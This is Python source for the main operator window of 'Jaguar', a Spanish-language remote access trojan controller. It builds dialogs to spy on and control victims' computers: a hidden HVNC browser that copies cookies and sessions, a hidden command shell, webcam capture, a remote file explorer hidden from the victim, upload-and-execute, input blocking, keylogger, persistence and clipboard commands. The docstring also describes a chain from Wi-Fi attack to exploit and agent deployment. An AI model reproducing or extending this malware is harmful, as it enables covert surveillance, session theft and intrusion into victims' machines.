# -*- coding: utf-8 -*-
"""Ventana principal Jaguar — escritorio remoto + HVNC + stealer + escaner + exploits.

Cadena de extremo a extremo: pestaña Wi-Fi (monitor → AP → PSK → conectar)
→ puente de subred al Escáner → hosts/puertos → recomendación de exploits
→ despliegue del agente → el cliente aparece solo en el árbol → menú
contextual filtrado por SO y capacidades reales del agente.
"""

import base64
import json
import os
import shutil
import subprocess
import threading
import time

from PyQt6.QtWidgets import (
    QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QFrame,
    QPushButton, QTreeWidget, QTreeWidgetItem, QTextEdit, QLabel, QComboBox,
    QSplitter, QMenu, QFileDialog, QInputDialog, QMessageBox, QCheckBox,
    QDialog, QLineEdit, QPlainTextEdit, QTabWidget, QProgressBar, QSlider,
    QListWidget, QListWidgetItem, QApplication,
)
from PyQt6.QtCore import Qt, pyqtSignal, QTimer
from PyQt6.QtGui import QAction, QPixmap

from jaguar.ui.theme import aplicar_tema_rojo_negro, ESTILO_BOTON, TENUE
from jaguar.ui.logo import obtener_logo, obtener_icono
from jaguar.server.servidor import Servidor
from jaguar.common.constants import APP_NAME, APP_VERSION
from jaguar.common import config, escaner, exploits, geo, explotadores, lateral, wifi
from jaguar.ui.movil_dialog import MovilDialog
from jaguar.builder.constructor import Constructor

# ---------------------------------------------------------------------------
# Import de la pestaña Wi-Fi. Si el modulo no esta, la app sigue arrancando
# (solo se pierde la pestaña), en vez de reventar en el import.
# ---------------------------------------------------------------------------
try:
    from jaguar.ui.wifi_tab import PanelWifi
except Exception:
    PanelWifi = None

# El dialogo antiguo se mantiene como acceso rapido desde el boton del Escaner.
try:
    from jaguar.ui.wifi_dialog import WifiOfensivoDialog
except Exception:
    WifiOfensivoDialog = None

# ---------------------------------------------------------------------------
# Listas de clasificacion. Se importan de constants si estan (version 2.1) y
# si no, se definen aqui: asi este fichero es compatible con las dos versiones.
# ---------------------------------------------------------------------------
try:
    from jaguar.common.constants import (  # type: ignore
        CMDS_RECON as _CR, CMDS_SILENCIOSOS as _CS, CMDS_SIN_DATOS as _CD,
        PREFIJO_MOVIL as _PM,
    )
except Exception:
    _CR = ("powershell", "whoami", "netstat", "arp", "ipconfig", "tasklist",
           "net_user", "net_view", "schtasks_list", "drives", "env", "wmi",
           "spawn", "portscan", "recon_full")
    _CS = ("ping", "raton", "teclado", "hvnc_raton", "hvnc_teclado",
           "hvnc_captura", "hvnc_stream", "captura_stream", "webcam_frame",
           "captura", "hvnc_estado", "stealer_estado", "movil_pantalla")
    _CD = ("hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar", "hvnc_stream",
           "captura_stream", "webcam_iniciar", "webcam_parar", "hvnc_opciones",
           "bloquear_entrada", "persistir", "proxy_iniciar", "proxy_parar",
           "swap_raton", "clip_set", "abrir_url", "mensaje", "subir_ejecutar",
           "keylogger_iniciar")
    _PM = "movil_"

CMDS_RECON = tuple(_CR)
CMDS_SILENCIOSOS = tuple(_CS)
CMDS_SIN_DATOS = tuple(_CD)
PREFIJO_MOVIL = _PM

# Columnas del arbol de clientes. "Arq." (RF10) es informativa: sale del
# sysinfo del agente (info["arquitectura"]).
COLS = ["", "ID", "Host", "Usuario", "SO", "Arq.", "IP", "País", "ISP", "Lat."]
COL_LAT = 9

VK_ESPECIALES = {
    Qt.Key.Key_Return: 0x0D, Qt.Key.Key_Enter: 0x0D, Qt.Key.Key_Backspace: 0x08,
    Qt.Key.Key_Tab: 0x09, Qt.Key.Key_Escape: 0x1B, Qt.Key.Key_Delete: 0x2E,
    Qt.Key.Key_Left: 0x25, Qt.Key.Key_Up: 0x26, Qt.Key.Key_Right: 0x27,
    Qt.Key.Key_Down: 0x28, Qt.Key.Key_Home: 0x24, Qt.Key.Key_End: 0x23,
}

# Orden de presentacion por SO para el boton "ordenar" (RF10).
ORDEN_SO = {"windows": 0, "linux": 1, "macos": 2, "android": 3}


def wifi_ofensivo_hay_stack():
    try:
        from jaguar.common import wifi_ofensivo as _wf
        return _wf.hay_stack()
    except Exception:
        return False


class TerminalDialog(QDialog):
    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.setWindowTitle(f"Terminal — {nombre} ({cid[:8]})")
        self.resize(840, 520)
        aplicar_tema_rojo_negro(self)
        lay = QVBoxLayout(self)
        self.output = QPlainTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet("background:#0b0b0d;color:#ff5c5c;font-family:Consolas;")
        lay.addWidget(self.output)
        fila = QHBoxLayout()
        fila.addWidget(QLabel("shell>"))
        self.input = QLineEdit()
        self.input.returnPressed.connect(self.ejecutar)
        fila.addWidget(self.input)
        lay.addLayout(fila)
        b = QPushButton("Ejecutar")
        b.setStyleSheet(ESTILO_BOTON)
        b.clicked.connect(self.ejecutar)
        lay.addWidget(b)

    def ejecutar(self):
        cmd = self.input.text().strip()
        if not cmd:
            return
        self.output.appendPlainText(f"> {cmd}")
        self.input.clear()
        p = self.parent()
        if hasattr(p, "_enviar_comando"):
            p._enviar_comando(self.cid, "shell", {"comando": cmd})

    def append_respuesta(self, t):
        self.output.appendPlainText(t)
        self.output.appendPlainText("")


class GaleriaDialog(QDialog):
    """Visor tipo video de las capturas guardadas de un cliente."""

    def __init__(self, carpeta, parent=None):
        super().__init__(parent)
        self.carpeta = carpeta
        self.setWindowTitle(f"Galería de capturas — {os.path.basename(carpeta)}")
        self.resize(1040, 720)
        aplicar_tema_rojo_negro(self)
        self._archivos = []
        self._idx = 0
        self._pm = None

        l = QVBoxLayout(self)
        self.pantalla = QLabel("cargando...")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        l.addWidget(self.pantalla, 1)

        barra = QHBoxLayout()
        b_prev = QPushButton("◀ Anterior")
        b_prev.setStyleSheet(ESTILO_BOTON)
        b_prev.clicked.connect(self._anterior)
        barra.addWidget(b_prev)
        self.b_play = QPushButton("▶ Reproducir")
        self.b_play.setStyleSheet(ESTILO_BOTON)
        self.b_play.clicked.connect(self._toggle_play)
        barra.addWidget(self.b_play)
        b_next = QPushButton("Siguiente ▶")
        b_next.setStyleSheet(ESTILO_BOTON)
        b_next.clicked.connect(self._siguiente)
        barra.addWidget(b_next)
        self.slider = QSlider(Qt.Orientation.Horizontal)
        self.slider.valueChanged.connect(self._ir_a)
        barra.addWidget(self.slider, 1)
        self.lbl_pos = QLabel("0/0")
        self.lbl_pos.setStyleSheet(f"color:{TENUE};")
        barra.addWidget(self.lbl_pos)
        b_del = QPushButton("🗑 Borrar")
        b_del.setStyleSheet(ESTILO_BOTON)
        b_del.clicked.connect(self._borrar)
        barra.addWidget(b_del)
        l.addLayout(barra)

        self._timer = QTimer(self)
        self._timer.timeout.connect(self._siguiente)
        self._cargar()

    def _cargar(self):
        try:
            self._archivos = sorted(
                os.path.join(self.carpeta, f)
                for f in os.listdir(self.carpeta) if f.lower().endswith(".png"))
        except Exception:
            self._archivos = []
        self.slider.setRange(0, max(0, len(self._archivos) - 1))
        if self._archivos:
            self._mostrar(0)
        else:
            self.pantalla.setText("sin capturas en esta carpeta")

    def _mostrar(self, i):
        if not self._archivos:
            return
        self._idx = max(0, min(i, len(self._archivos) - 1))
        pm = QPixmap(self._archivos[self._idx])
        self._pm = pm if not pm.isNull() else None
        self._escalar()
        self.lbl_pos.setText(f"{self._idx + 1}/{len(self._archivos)}")
        if self.slider.value() != self._idx:
            self.slider.blockSignals(True)
            self.slider.setValue(self._idx)
            self.slider.blockSignals(False)

    def _escalar(self):
        if not self._pm:
            return
        area = self.pantalla.size()
        self.pantalla.setPixmap(self._pm.scaled(
            area, Qt.AspectRatioMode.KeepAspectRatio,
            Qt.TransformationMode.SmoothTransformation))

    def resizeEvent(self, e):
        self._escalar()
        super().resizeEvent(e)

    def _ir_a(self, v):
        self._mostrar(v)

    def _siguiente(self):
        if self._archivos:
            self._mostrar((self._idx + 1) % len(self._archivos))

    def _anterior(self):
        if self._archivos:
            self._mostrar((self._idx - 1) % len(self._archivos))

    def _toggle_play(self):
        if self._timer.isActive():
            self._timer.stop()
            self.b_play.setText("▶ Reproducir")
        else:
            self._timer.start(120)      # ~8 fps, como el stream
            self.b_play.setText("⏸ Pausar")

    def _borrar(self):
        if not self._archivos:
            return
        try:
            os.remove(self._archivos[self._idx])
        except Exception:
            return
        self._cargar()

    def closeEvent(self, e):
        self._timer.stop()
        super().closeEvent(e)


class EscritorioDialog(QDialog):
    """Escritorio remoto en tiempo real + grabacion continua de capturas."""

    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.parent = parent
        self.rem_w, self.rem_h = 1920, 1080
        self._esc = 1.0
        self._off_x = 0
        self._off_y = 0
        self._carpeta_shot = parent._carpeta_capturas(cid)
        self._n_shot = self._contar_capturas()
        self.setWindowTitle(f"Escritorio — {nombre}")
        self.resize(1000, 660)
        aplicar_tema_rojo_negro(self)
        self.setMouseTracking(True)

        lay = QVBoxLayout(self)
        barra = QHBoxLayout()
        self.chk_captura = QCheckBox("Capturar pantalla")
        self.chk_control = QCheckBox("Controlar ratón")
        self.chk_teclado = QCheckBox("Controlar teclado")
        self.chk_bloqueo = QCheckBox("Bloquear entrada local")
        self.chk_guardar = QCheckBox("Grabar capturas (video)")
        for c in (self.chk_captura, self.chk_control, self.chk_teclado,
                  self.chk_bloqueo, self.chk_guardar):
            c.setChecked(False)
            barra.addWidget(c)
        b_gal = QPushButton("🎞 Galería")
        b_gal.setStyleSheet(ESTILO_BOTON)
        b_gal.clicked.connect(self._abrir_galeria)
        barra.addWidget(b_gal)
        barra.addStretch()
        self.lbl_info = QLabel("visor")
        self.lbl_info.setStyleSheet(f"color:{TENUE};")
        barra.addWidget(self.lbl_info)
        lay.addLayout(barra)

        barra2 = QHBoxLayout()
        barra2.addWidget(QLabel("Calidad:"))
        self.sl_cal = QSlider(Qt.Orientation.Horizontal)
        self.sl_cal.setRange(20, 90)
        self.sl_cal.setValue(65)
        self.sl_cal.setFixedWidth(120)
        barra2.addWidget(self.sl_cal)
        barra2.addWidget(QLabel("FPS:"))
        self.cb_fps = QComboBox()
        self.cb_fps.addItems(["2", "5", "8", "12", "20"])
        self.cb_fps.setCurrentText("8")
        barra2.addWidget(self.cb_fps)
        barra2.addWidget(QLabel("Escala:"))
        self.cb_esc = QComboBox()
        self.cb_esc.addItems(["100%", "75%", "50%"])
        self.cb_esc.setCurrentText("75%")
        barra2.addWidget(self.cb_esc)
        b_full = QPushButton("Pantalla completa")
        b_full.setStyleSheet(ESTILO_BOTON)
        b_full.clicked.connect(self._fullscreen)
        barra2.addWidget(b_full)
        b_save = QPushButton("Guardar 1 captura")
        b_save.setStyleSheet(ESTILO_BOTON)
        b_save.clicked.connect(self._guardar)
        barra2.addWidget(b_save)
        b_clip = QPushButton("Traer portapapeles")
        b_clip.setStyleSheet(ESTILO_BOTON)
        b_clip.clicked.connect(lambda: self.parent._enviar_comando(self.cid, "clip_get"))
        barra2.addWidget(b_clip)
        barra2.addStretch()
        lay.addLayout(barra2)

        self.pantalla = QLabel("activa «Capturar pantalla» para ver el escritorio")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        self.pantalla.setMouseTracking(True)
        self.pantalla.setFocusPolicy(Qt.FocusPolicy.StrongFocus)
        lay.addWidget(self.pantalla, 1)

        self.chk_captura.stateChanged.connect(lambda _=0: self._stream())
        self.cb_fps.currentTextChanged.connect(lambda _: self._stream())
        self.sl_cal.valueChanged.connect(lambda _: self._stream())
        self.cb_esc.currentTextChanged.connect(lambda _: self._stream())
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._stream)
        self.timer.start(2000)

        self.chk_captura.setChecked(True)
        self._stream()

    def _contar_capturas(self):
        try:
            return len([f for f in os.listdir(self._carpeta_shot)
                        if f.lower().endswith(".png")])
        except Exception:
            return 0

    def _abrir_galeria(self):
        GaleriaDialog(self._carpeta_shot, self).exec()

    def _stream(self):
        if not self.chk_captura.isChecked():
            self.parent._enviar_comando(self.cid, "captura_stream", {"on": False})
            return
        esc = int(self.cb_esc.currentText().rstrip("%")) / 100.0
        self.parent._enviar_comando(self.cid, "captura_stream", {
            "on": True, "fps": int(self.cb_fps.currentText()),
            "calidad": self.sl_cal.value(), "escala": esc})

    def _fullscreen(self):
        if self.isFullScreen():
            self.showNormal()
        else:
            self.showFullScreen()

    def _guardar(self):
        self.parent._screenshot(self.cid)

    def set_frame(self, pm, w, h):
        self.rem_w, self.rem_h = max(1, w), max(1, h)
        area = self.pantalla.size()
        escalado = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
                             Qt.TransformationMode.SmoothTransformation)
        self.pantalla.setPixmap(escalado)
        self._off_x = (area.width() - escalado.width()) // 2
        self._off_y = (area.height() - escalado.height()) // 2
        self._esc = escalado.width() / self.rem_w if self.rem_w else 1.0
        self.lbl_info.setText(f"{self.rem_w}x{self.rem_h}")
        if self.chk_guardar.isChecked():
            self._n_shot += 1
            try:
                pm.save(os.path.join(self._carpeta_shot,
                                     f"{self._n_shot:06d}.png"))
            except Exception:
                pass

    def _coords(self, pos):
        x = int((pos.x() - self._off_x) / self._esc) if self._esc else 0
        y = int((pos.y() - self._off_y) / self._esc) if self._esc else 0
        return max(0, min(self.rem_w, x)), max(0, min(self.rem_h, y))

    def _raton(self, accion, pos=None, extra=None):
        if not self.chk_control.isChecked():
            return
        args = {"accion": accion}
        if pos is not None:
            x, y = self._coords(pos)
            args["x"], args["y"] = x, y
        if extra:
            args.update(extra)
        self.parent._enviar_comando(self.cid, "raton", args)

    def mousePressEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("right_down" if e.button() == Qt.MouseButton.RightButton else "down", pos)

    def mouseReleaseEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("right_up" if e.button() == Qt.MouseButton.RightButton else "up", pos)

    def mouseMoveEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("move", pos)

    def mouseDoubleClickEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("doble", pos)

    def wheelEvent(self, e):
        self._raton("scroll", extra={"delta": 120 if e.angleDelta().y() > 0 else -120})

    def keyPressEvent(self, e):
        if not self.chk_teclado.isChecked():
            return
        vk = VK_ESPECIALES.get(e.key())
        if vk:
            self.parent._enviar_comando(self.cid, "teclado", {"vk": vk})
        else:
            t = e.text()
            if t:
                self.parent._enviar_comando(self.cid, "teclado", {"texto": t})

    def closeEvent(self, e):
        self.timer.stop()
        try:
            self.parent._enviar_comando(self.cid, "captura_stream", {"on": False})
        except Exception:
            pass
        try:
            self.parent.escritorios_por_cid.get(self.cid, []).remove(self)
        except ValueError:
            pass
        super().closeEvent(e)


class HvncDialog(QDialog):
    """HVNC. Casillas desmarcadas. Captura por STREAM (push)."""

    NAVEGADORES = ["chrome", "edge", "brave", "opera", "firefox"]

    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.parent = parent
        self.rem_w, self.rem_h = 1200, 800
        self._esc = 1.0
        self._off_x = 0
        self._off_y = 0
        self._nav_activo = None
        self.setWindowTitle(f"HVNC — {nombre}")
        self.resize(1000, 720)
        aplicar_tema_rojo_negro(self)
        l = QVBoxLayout(self)
        l.setSpacing(8)
        l.addWidget(QLabel("Lanzar navegador en segundo plano (oculto, fuera de pantalla):"))
        barra = QHBoxLayout()
        for nav in self.NAVEGADORES:
            b = QPushButton(nav.capitalize())
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, n=nav: self.iniciar(n))
            barra.addWidget(b)
        barra.addStretch()
        b_cerrar = QPushButton("Cerrar navegador (solo el oculto)")
        b_cerrar.setStyleSheet(ESTILO_BOTON)
        b_cerrar.clicked.connect(self.cerrar_nav)
        barra.addWidget(b_cerrar)
        l.addLayout(barra)

        fila = QHBoxLayout()
        self.chk_oculto = QCheckBox("Modo oculto")
        self.chk_cookies = QCheckBox("Copiar cookies / sesión")
        self.chk_control = QCheckBox("Control (ratón/teclado)")
        self.chk_captura = QCheckBox("Capturar pantalla")
        self.chk_shell = QCheckBox("Explorador")
        self.chk_cmd = QCheckBox("CMD oculto")
        for c in (self.chk_oculto, self.chk_cookies, self.chk_control,
                  self.chk_captura, self.chk_shell, self.chk_cmd):
            c.setChecked(False)
            fila.addWidget(c)
        fila.addStretch()
        self.lbl = QLabel("listo.")
        self.lbl.setStyleSheet(f"color:{TENUE};")
        fila.addWidget(self.lbl)
        l.addLayout(fila)

        fila2 = QHBoxLayout()
        fila2.addWidget(QLabel("Calidad:"))
        self.sl_cal = QSlider(Qt.Orientation.Horizontal)
        self.sl_cal.setRange(20, 90)
        self.sl_cal.setValue(55)
        self.sl_cal.setFixedWidth(110)
        self.sl_cal.valueChanged.connect(self._opciones)
        fila2.addWidget(self.sl_cal)
        fila2.addWidget(QLabel("FPS:"))
        self.cb_fps = QComboBox()
        self.cb_fps.addItems(["4", "6", "8", "12", "15"])
        self.cb_fps.setCurrentText("10")
        self.cb_fps.currentTextChanged.connect(self._opciones)
        fila2.addWidget(self.cb_fps)
        fila2.addWidget(QLabel("Escala:"))
        self.cb_esc = QComboBox()
        self.cb_esc.addItems(["100%", "75%", "50%"])
        self.cb_esc.setCurrentText("75%")
        self.cb_esc.currentTextChanged.connect(self._opciones)
        fila2.addWidget(self.cb_esc)
        b_clip = QPushButton("Traer portapapeles")
        b_clip.setStyleSheet(ESTILO_BOTON)
        b_clip.clicked.connect(lambda: self.parent._enviar_comando(self.cid, "clip_get"))
        fila2.addWidget(b_clip)
        fila2.addStretch()
        l.addLayout(fila2)

        l.addWidget(QLabel("Navegar a URL en el HVNC:"))
        f2 = QHBoxLayout()
        self.in_url = QLineEdit("https://")
        self.in_url.returnPressed.connect(self.navegar)
        f2.addWidget(self.in_url)
        b_nav = QPushButton("Ir")
        b_nav.setStyleSheet(ESTILO_BOTON)
        b_nav.clicked.connect(self.navegar)
        f2.addWidget(b_nav)
        l.addLayout(f2)

        self.pantalla = QLabel("pulsa un navegador para iniciar el HVNC")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        self.pantalla.setMouseTracking(True)
        self.pantalla.setFocusPolicy(Qt.FocusPolicy.StrongFocus)
        l.addWidget(self.pantalla, 1)

        self.chk_captura.stateChanged.connect(lambda _=0: self._stream())
        self.timer_estado = QTimer(self)
        self.timer_estado.timeout.connect(
            lambda: self.parent._enviar_comando(self.cid, "hvnc_estado"))
        self.timer_estado.start(1500)

    def _opciones(self):
        esc = int(self.cb_esc.currentText().rstrip("%")) / 100.0
        self.parent._enviar_comando(self.cid, "hvnc_opciones", {
            "calidad": self.sl_cal.value(),
            "escala": esc,
            "fps": int(self.cb_fps.currentText())})
        self._stream()

    def _stream(self):
        if not self.chk_captura.isChecked():
            self.parent._enviar_comando(self.cid, "hvnc_stream", {"on": False})
            return
        self.parent._enviar_comando(self.cid, "hvnc_stream", {
            "on": True, "fps": int(self.cb_fps.currentText())})
        self.parent._enviar_comando(self.cid, "hvnc_captura", {"forzar": True})

    def iniciar(self, nav):
        self._nav_activo = nav
        self.parent._enviar_comando(self.cid, "hvnc_iniciar", {
            "navegador": nav,
            "copiar_sesion": self.chk_cookies.isChecked(),
            "oculto": self.chk_oculto.isChecked(),
            "shell": self.chk_shell.isChecked(),
            "cmd": self.chk_cmd.isChecked()})
        self.lbl.setText(f"lanzando {nav}...")
        self._opciones()

    def set_estado(self, datos):
        est = datos.get("estado")
        err = datos.get("error")
        if err:
            self.lbl.setText(f"ERROR: {err}")
        elif est:
            self.lbl.setText(str(est))

    def cerrar_nav(self):
        nav = self._nav_activo or "chrome"
        self.parent._enviar_comando(self.cid, "hvnc_cerrar", {"navegador": nav})
        self._nav_activo = None
        self.lbl.setText(f"cerrando {nav} (solo el oculto)...")

    def navegar(self):
        url = self.in_url.text().strip()
        if url:
            self.parent._enviar_comando(self.cid, "hvnc_navegar",
                                        {"navegador": self._nav_activo or "chrome",
                                         "url": url})

    def set_frame(self, pm, w, h):
        if pm.isNull():
            return
        self.rem_w, self.rem_h = max(1, int(w)), max(1, int(h))
        area = self.pantalla.size()
        escalado = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
                             Qt.TransformationMode.SmoothTransformation)
        self.pantalla.setPixmap(escalado)
        self._off_x = (area.width() - escalado.width()) // 2
        self._off_y = (area.height() - escalado.height()) // 2
        self._esc = escalado.width() / self.rem_w if self.rem_w else 1.0
        self.lbl.setText(f"{self.rem_w}x{self.rem_h}")

    def _coords(self, pos):
        x = int((pos.x() - self._off_x) / self._esc) if self._esc else 0
        y = int((pos.y() - self._off_y) / self._esc) if self._esc else 0
        return max(0, min(self.rem_w, x)), max(0, min(self.rem_h, y))

    def _raton(self, accion, pos=None, extra=None):
        if not self.chk_control.isChecked():
            return
        args = {"accion": accion}
        if pos is not None:
            x, y = self._coords(pos)
            args["x"], args["y"] = x, y
        if extra:
            args.update(extra)
        self.parent._enviar_comando(self.cid, "hvnc_raton", args)

    def mousePressEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("right_down" if e.button() == Qt.MouseButton.RightButton else "down", pos)

    def mouseReleaseEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("right_up" if e.button() == Qt.MouseButton.RightButton else "up", pos)

    def mouseMoveEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("move", pos)

    def mouseDoubleClickEvent(self, e):
        pos = self.pantalla.mapFrom(self, e.position().toPoint())
        self._raton("doble", pos)

    def wheelEvent(self, e):
        self._raton("scroll", extra={"delta": 120 if e.angleDelta().y() > 0 else -120})

    def keyPressEvent(self, e):
        if not self.chk_control.isChecked():
            return
        vk = VK_ESPECIALES.get(e.key())
        if vk:
            self.parent._enviar_comando(self.cid, "hvnc_teclado", {"vk": vk})
        else:
            t = e.text()
            if t:
                self.parent._enviar_comando(self.cid, "hvnc_teclado", {"texto": t})

    def closeEvent(self, e):
        self.timer_estado.stop()
        try:
            self.parent._enviar_comando(self.cid, "hvnc_stream", {"on": False})
        except Exception:
            pass
        try:
            self.parent.hvnc_por_cid.get(self.cid, []).remove(self)
        except ValueError:
            pass
        super().closeEvent(e)


class WebcamDialog(QDialog):
    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.parent = parent
        self.setWindowTitle(f"Webcam — {nombre}")
        self.resize(680, 540)
        aplicar_tema_rojo_negro(self)
        l = QVBoxLayout(self)
        self.pantalla = QLabel("iniciando cámara...")
        self.pantalla.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.pantalla.setStyleSheet("background:#000;")
        l.addWidget(self.pantalla, 1)
        self.lbl = QLabel("")
        self.lbl.setStyleSheet(f"color:{TENUE};")
        l.addWidget(self.lbl)
        parent._enviar_comando(cid, "webcam_iniciar", {"cam": 0})
        self.timer = QTimer(self)
        self.timer.timeout.connect(lambda: parent._enviar_comando(cid, "webcam_frame"))
        self.timer.start(150)

    def set_frame(self, pm, w, h):
        if pm.isNull():
            return
        area = self.pantalla.size()
        escalado = pm.scaled(area, Qt.AspectRatioMode.KeepAspectRatio,
                             Qt.TransformationMode.SmoothTransformation)
        self.pantalla.setPixmap(escalado)
        self.lbl.setText(f"{w}x{h}")

    def closeEvent(self, e):
        self.timer.stop()
        self.parent._enviar_comando(self.cid, "webcam_parar")
        try:
            self.parent.webcams_por_cid.get(self.cid, []).remove(self)
        except ValueError:
            pass
        super().closeEvent(e)


class ExploradorRemotoDialog(QDialog):
    """Explorador del sistema de la victima (oculto para ella)."""

    def __init__(self, cid, nombre, parent=None):
        super().__init__(parent)
        self.cid = cid
        self.parent = parent
        self.ruta_actual = "."
        self.setWindowTitle(f"Explorador de la víctima — {nombre} ({cid[:8]})")
        self.resize(780, 580)
        aplicar_tema_rojo_negro(self)
        l = QVBoxLayout(self)

        barra = QHBoxLayout()
        b_subir = QPushButton("⬆")
        b_subir.setFixedWidth(36)
        b_subir.setStyleSheet(ESTILO_BOTON)
        b_subir.clicked.connect(self._subir)
        barra.addWidget(b_subir)
        self.in_ruta = QLineEdit(".")
        self.in_ruta.returnPressed.connect(self._ir)
        barra.addWidget(self.in_ruta)
        b_ir = QPushButton("Ir")
        b_ir.setStyleSheet(ESTILO_BOTON)
        b_ir.clicked.connect(self._ir)
        barra.addWidget(b_ir)
        b_ref = QPushButton("⟳")
        b_ref.setFixedWidth(36)
        b_ref.setStyleSheet(ESTILO_BOTON)
        b_ref.clicked.connect(lambda: self._listar(self.ruta_actual))
        barra.addWidget(b_ref)
        l.addLayout(barra)

        accesos = QHBoxLayout()
        for etq, ruta in (("C:\\", "C:\\"), ("D:\\", "D:\\"), ("E:\\", "E:\\"),
                          ("/", "/"), ("· actual", ".")):
            b = QPushButton(etq)
            b.setStyleSheet(ESTILO_BOTON)
            b.clicked.connect(lambda _, r=ruta: self._listar(r))
            accesos.addWidget(b)
        accesos.addStretch()
        l.addLayout(accesos)

        self.lista = QListWidget()
        self.lista.itemDoubleClicked.connect(self._entrar)
        l.addWidget(self.lista, 1)

        fila = QHBoxLayout()
        b_desc = QPushButton("⬇  Descargar seleccionado")
        b_desc.setStyleSheet(ESTILO_BOTON)
        b_desc.clicked.connect(self._descargar)
        fila.addWidget(b_desc)
        b_sub = QPushButton("⬆  Subir y ejecutar aquí")
        b_sub.setStyleSheet(ESTILO_BOTON)
        b_sub.clicked.connect(self._subir_archivo)
        fila.addWidget(b_sub)
        fila.addStretch()
        l.addLayout(fila)

        self._listar(self.ruta_actual)

    def _sep(self):
        return "\\" if "\\" in self.ruta_actual else "/"

    def _listar(self, ruta):
        self.ruta_actual = ruta or "."
        self.parent._enviar_comando(self.cid, "listar_dir", {"ruta": self.ruta_actual})

    def _ir(self):
        self._listar(self.in_ruta.text().strip() or ".")

    def _subir(self):
        r = self.ruta_actual.rstrip("/\\")
        sep = self._sep()
        padre = r.rsplit(sep, 1)[0] if sep in r else r
        self._listar(padre or sep)

    def _entrar(self, item):
        nombre = item.data(int(Qt.ItemDataRole.UserRole) + 1)
        es_dir = item.data(int(Qt.ItemDataRole.UserRole) + 2)
        if es_dir and nombre:
            self._listar(self.ruta_actual.rstrip("/\\") + self._sep() + nombre)

    def set_listado(self, datos):
        self.lista.clear()
        if datos.get("error"):
            self.lista.addItem(f"[error] {datos['error']}")
            return
        self.ruta_actual = datos.get("ruta", self.ruta_actual)
        self.in_ruta.setText(self.ruta_actual)
        for it in sorted(datos.get("items", []),
                         key=lambda x: (not x.get("dir"), x.get("nombre", "").lower())):
            icono = "📁 " if it.get("dir") else "📄 "
            li = QListWidgetItem(icono + it.get("nombre", ""))
            li.setData(int(Qt.ItemDataRole.UserRole) + 1, it.get("nombre", ""))
            li.setData(int(Qt.ItemDataRole.UserRole) + 2, bool(it.get("dir")))
            self.lista.addItem(li)

    def _ruta_seleccionada(self):
        it = self.lista.currentItem()
        if not it:
            return None
        nombre = it.data(int(Qt.ItemDataRole.UserRole) + 1)
        if not nombre:
            return None
        return self.ruta_actual.rstrip("/\\") + self._sep() + nombre

    def _descargar(self):
        ruta = self._ruta_seleccionada()
        if ruta:
            self.parent._descargar_remoto(self.cid, ruta)

    def _subir_archivo(self):
        ruta, _ = QFileDialog.getOpenFileName(self, "Archivo a subir y ejecutar")
        if not ruta:
            return
        with open(ruta, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
        self.parent._enviar_comando(self.cid, "subir_ejecutar",
                                    {"nombre": os.path.basename(ruta), "b64": b64})

    def closeEvent(self, e):
        try:
            self.parent.exploradores_por_cid.get(self.cid, []).remove(self)
        except ValueError:
            pass
        super().closeEvent(e)


class MainWindow(QMainWindow):
    _sig_log = pyqtSignal(str)
    _sig_escaneo_fin = pyqtSignal(list)
    _sig_escaneo_prog = pyqtSignal(int)
    _sig_geo = pyqtSignal(str, dict)
    _sig_builder = pyqtSignal(str)
    _sig_nativo = pyqtSignal(str)
    _sig_stealer = pyqtSignal(str)
    _sig_nse = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"{APP_NAME} v{APP_VERSION} — Remote Administration")
        self.setWindowIcon(obtener_icono())
        self.resize(1360, 820)
        self.setMinimumSize(1050, 640)
        aplicar_tema_rojo_negro(self)

        self.servidor = Servidor()
        self.servidor.cliente_conectado.connect(self._on_cliente_conectado)
        self.servidor.cliente_desconectado.connect(self._on_cliente_desconectado)
        self.servidor.mensaje_recibido.connect(self._on_mensaje_recibido)
        self.servidor.log.connect(self._log)

        self.servidor_activo = False
        self.clientes = {}
        self.ultimo_escaneo = []
        self.dialogs_por_cid = {}
        self.escritorios_por_cid = {}
        self.hvnc_por_cid = {}
        self.webcams_por_cid = {}
        self.exploradores_por_cid = {}
        self.movil_por_cid = {}
        self._pings = {}
        self._screenshot_pend = {}
        self._filtro_so = ""

        self._sig_log.connect(self._log)
        self._sig_escaneo_fin.connect(self._on_escaneo_fin)
        self._sig_escaneo_prog.connect(self._on_escaneo_prog)
        self._sig_geo.connect(self._aplicar_geo)
        self._sig_builder.connect(self._on_builder_log)
        self._sig_nativo.connect(self._append_nativo)
        self._sig_stealer.connect(self._append_stealer)
        self._sig_nse.connect(self._append_nativo)

        self._build_ui()
        self._ping_timer = QTimer(self)
        self._ping_timer.timeout.connect(self._ping_todos)
        self._ping_timer.start(3000)

    # ================================================================= UI
    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        root = QVBoxLayout(central)
        root.setContentsMargins(0, 0, 0, 0)
